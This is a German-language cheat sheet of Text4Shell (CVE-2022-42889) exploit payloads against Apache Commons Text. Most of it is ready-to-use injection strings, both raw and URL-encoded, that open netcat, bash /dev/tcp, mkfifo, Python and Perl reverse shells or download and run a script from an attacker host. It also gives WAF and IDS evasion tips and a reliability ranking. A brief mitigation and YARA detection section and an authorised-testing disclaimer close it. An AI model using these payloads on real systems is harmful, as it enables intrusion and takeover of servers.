# Text4Shell (CVE-2022-42889) - Reverse Shell Payloads

## Übersicht

Apache Commons Text < 1.10.0 ist anfällig für Remote Code Execution durch String Substitution.

**Verwundbare Versionen:** Apache Commons Text 1.5 - 1.9

---

## Basic Syntax

```
${script:javascript:java.lang.Runtime.getRuntime().exec('COMMAND')}
```

**URL-Encoded Template:**
```
%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27COMMAND%27%29%7D
```

---

## 1. Ping Test (Verbindungstest)

### Payload:
```
${script:javascript:java.lang.Runtime.getRuntime().exec('ping -c 1 192.168.1.184')}
```

### URL-Encoded:
```
%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27ping%20-c%201%20192.168.1.184%27%29%7D
```

### Listener:
```bash
sudo tcpdump -i any icmp and src host TARGET_IP
```

---

## 2. DNS Lookup (Out-of-Band Detection)

### Payload:
```
${script:javascript:java.lang.Runtime.getRuntime().exec('nslookup attacker.burpcollaborator.net')}
```

### URL-Encoded:
```
%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nslookup%20attacker.burpcollaborator.net%27%29%7D
```

### Alternative mit dig:
```
${script:javascript:java.lang.Runtime.getRuntime().exec('dig @8.8.8.8 attacker.com')}
```

---

## 3. HTTP Callback

### Payload:
```
${script:javascript:java.lang.Runtime.getRuntime().exec('curl http://192.168.1.184:8000/test')}
```

### URL-Encoded:
```
%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27curl%20http%3A%2F%2F192.168.1.184%3A8000%2Ftest%27%29%7D
```

### Listener:
```bash
python3 -m http.server 8000
```

### Alternative mit wget:
```
${script:javascript:java.lang.Runtime.getRuntime().exec('wget http://192.168.1.184:8000/test')}
```

---

## 4. Netcat Reverse Shell (Traditional)

### Payload:
```
${script:javascript:java.lang.Runtime.getRuntime().exec('nc 192.168.1.184 445 -e /bin/bash')}
```

### URL-Encoded:
```
%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nc%20192.168.1.184%20445%20-e%20%2Fbin%2Fbash%27%29%7D
```

### Listener:
```bash
nc -lvnp 445
```

**⚠️ Problem:** `-e` Flag oft nicht verfügbar (BSD netcat)

---

## 5. Bash /dev/tcp Reverse Shell ⭐ (EMPFOHLEN)

### Payload:
```
${script:javascript:java.lang.Runtime.getRuntime().exec('bash -c bash -i >& /dev/tcp/192.168.1.184/445 0>&1')}
```

### Mit ProcessBuilder (zuverlässiger):
```
${script:javascript:new java.lang.ProcessBuilder('/bin/bash','-c','bash -i >& /dev/tcp/192.168.1.184/445 0>&1').start()}
```

### URL-Encoded (ProcessBuilder):
```
%24%7Bscript%3Ajavascript%3Anew%20java.lang.ProcessBuilder%28%27%2Fbin%2Fbash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.184%2F445%200%3E%261%27%29.start%28%29%7D
```

### Listener:
```bash
nc -lvnp 445
```

---

## 6. Base64 Encoded Bash Reverse Shell

### Erstelle Base64 Payload:
```bash
echo -n 'bash -i >& /dev/tcp/192.168.1.184/445 0>&1' | base64
# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE4NC80NDUgMD4mMQ==
```

### Payload:
```
${script:javascript:java.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE4NC80NDUgMD4mMQ==}|{base64,-d}|{bash,-i}')}
```

### URL-Encoded:
```
%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE4NC80NDUgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%27%29%7D
```

---

## 7. Named Pipe (mkfifo) Reverse Shell

### Payload:
```
${script:javascript:java.lang.Runtime.getRuntime().exec('bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.1.184 445 >/tmp/f')}
```

### URL-Encoded:
```
%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27bash%20-c%20rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.1.184%20445%20%3E%2Ftmp%2Ff%27%29%7D
```

### Listener:
```bash
nc -lvnp 445
```

---

## 8. Python Reverse Shell

### Payload (Python 2):
```
${script:javascript:java.lang.Runtime.getRuntime().exec('python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.184\",445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])')}
```

### Payload (Python 3):
```
${script:javascript:java.lang.Runtime.getRuntime().exec('python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.184\",445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])')}
```

### Listener:
```bash
nc -lvnp 445
```

---

## 9. Perl Reverse Shell

### Payload:
```
${script:javascript:java.lang.Runtime.getRuntime().exec('perl -e use Socket;$i=\"192.168.1.184\";$p=445;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};')}
```

---

## 10. Download & Execute Script ⭐ (FLEXIBEL)

### Setup auf Angreifer-Maschine:

**1. Erstelle reverse.sh:**
```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.184/445 0>&1
```

**2. HTTP Server starten:**
```bash
python3 -m http.server 8000
```

**3. Listener starten:**
```bash
nc -lvnp 445
```

### Payload (curl):
```
${script:javascript:java.lang.Runtime.getRuntime().exec('curl http://192.168.1.184:8000/reverse.sh|bash')}
```

### URL-Encoded:
```
%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27curl%20http%3A%2F%2F192.168.1.184%3A8000%2Freverse.sh%7Cbash%27%29%7D
```

### Payload (wget):
```
${script:javascript:java.lang.Runtime.getRuntime().exec('wget -O /tmp/rev.sh http://192.168.1.184:8000/reverse.sh && bash /tmp/rev.sh')}
```

---

## 11. Java ProcessBuilder (Multiple Commands)

### Payload:
```
${script:javascript:new java.lang.ProcessBuilder(new String[]{"bash","-c","wget http://192.168.1.184:8000/shell.sh -O /tmp/s.sh && bash /tmp/s.sh"}).start()}
```

### URL-Encoded:
```
%24%7Bscript%3Ajavascript%3Anew%20java.lang.ProcessBuilder%28new%20String%5B%5D%7B%22bash%22%2C%22-c%22%2C%22wget%20http%3A%2F%2F192.168.1.184%3A8000%2Fshell.sh%20-O%20%2Ftmp%2Fs.sh%20%26%26%20bash%20%2Ftmp%2Fs.sh%22%7D%29.start%28%29%7D
```

---

## 12. Alternative Script Engines

### JavaScript (kurz):
```
${script:js:java.lang.Runtime.getRuntime().exec('whoami')}
```

### Nashorn Engine:
```
${script:nashorn:java.lang.Runtime.getRuntime().exec('id')}
```

---

## Shell Upgrade nach erfolgreicher Connection

```bash
# Python PTY
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Ctrl+Z (Background)
# Dann:
stty raw -echo; fg
export TERM=xterm
export SHELL=/bin/bash
```

---

## Troubleshooting

### Ping funktioniert, aber Reverse Shell nicht:

1. **Firewall/Egress Filtering**
   - Versuche verschiedene Ports: 80, 443, 53, 8080
   - Teste mit DNS exfiltration

2. **Netcat -e nicht verfügbar**
   - Nutze `/dev/tcp` Methode
   - Nutze named pipe (mkfifo)

3. **Command Length Limit**
   - Nutze Base64 encoding
   - Nutze Download & Execute

4. **WAF/IDS**
   - Obfuscate mit Base64
   - Splitze Command in mehrere Requests
   - Nutze alternative Syntax

### Debugging:

```bash
# Check für HTTP Callbacks
python3 -m http.server 8000

# Check für DNS
sudo tcpdump -i any port 53

# Check für ICMP
sudo tcpdump -i any icmp

# Check für TCP connections
sudo tcpdump -i any dst port 445
```

---

## Defense & Detection

### Mitigations:
1. **Update auf Apache Commons Text >= 1.10.0**
2. **WAF Rules** für `${script:`, `${dns:`, `${url:` patterns
3. **Input Validation** - Reject special characters
4. **Network Segmentation** - Limit outbound connections

### Detection:
```bash
# Log Analysis
grep -r "\${script:" /var/log/
grep -r "\${dns:" /var/log/

# YARA Rule
rule text4shell {
    strings:
        $a = "${script:" nocase
        $b = "${dns:" nocase
        $c = "${url:" nocase
    condition:
        any of them
}
```

---

## Quick Reference Cheatsheet

| Methode | Zuverlässigkeit | Komplexität | Bemerkung |
|---------|----------------|-------------|-----------|
| Ping | ⭐⭐⭐⭐⭐ | Niedrig | Bester Initial Test |
| DNS | ⭐⭐⭐⭐⭐ | Niedrig | Out-of-Band Detection |
| HTTP | ⭐⭐⭐⭐ | Niedrig | Einfach zu monitoren |
| nc -e | ⭐⭐ | Niedrig | Oft nicht verfügbar |
| /dev/tcp | ⭐⭐⭐⭐⭐ | Mittel | **EMPFOHLEN** |
| mkfifo | ⭐⭐⭐⭐ | Mittel | Fallback für nc |
| Python | ⭐⭐⭐ | Mittel | Wenn Python installiert |
| Download+Exec | ⭐⭐⭐⭐⭐ | Mittel | Sehr flexibel |
| ProcessBuilder | ⭐⭐⭐⭐⭐ | Hoch | Am zuverlässigsten |

---

**Erstellt für Penetration Testing & Security Research**
**Nur für autorisierte Security-Tests verwenden!**
